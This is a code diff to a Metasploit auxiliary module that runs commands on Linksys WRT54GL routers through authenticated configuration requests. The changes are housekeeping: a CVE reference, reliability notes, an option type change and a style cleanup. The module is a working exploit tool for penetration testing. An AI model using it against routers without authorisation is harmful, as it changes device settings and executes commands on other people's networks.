@@ -27,13 +27,19 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
         'License' => MSF_LICENSE,
         'References' => [
+          [ 'CVE', '2023-31742' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-01' ],
           [ 'URL', 'http://www.s3cur1ty.de/attacking-linksys-wrt54gl' ],
           [ 'EDB', '24202' ],
           [ 'BID', '57459' ],
           [ 'OSVDB', '89421' ]
         ],
-        'DisclosureDate' => '2013-01-18'
+        'DisclosureDate' => '2013-01-18',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -44,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),
         OptString.new('HttpPassword', [ false, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
-        OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
+        OptAddress.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
         OptAddress.new('LANIP', [ false, 'LAN IP address of the router (default is RHOST)']),
         OptString.new('ROUTER_NAME', [ false, 'Name of the router', 'cisco']),
         OptString.new('WAN_DOMAIN', [ false, 'WAN Domain Name', 'test']),
@@ -152,10 +158,10 @@ class MetasploitModule < Msf::Auxiliary
           'wan_domain' => wandomain.to_s,
           'mtu_enable' => '1',
           'wan_mtu' => wanmtu.to_s,
-          'lan_ipaddr_0' => (ip[0]).to_s,
-          'lan_ipaddr_1' => (ip[1]).to_s,
-          'lan_ipaddr_2' => (ip[2]).to_s,
-          'lan_ipaddr_3' => (ip[3]).to_s,
+          'lan_ipaddr_0' => ip[0].to_s,
+          'lan_ipaddr_1' => ip[1].to_s,
+          'lan_ipaddr_2' => ip[2].to_s,
+          'lan_ipaddr_3' => ip[3].to_s,
           'lan_netmask' => netmask.to_s,
           'lan_proto' => 'dhcp',
           'dhcp_check' => '1',
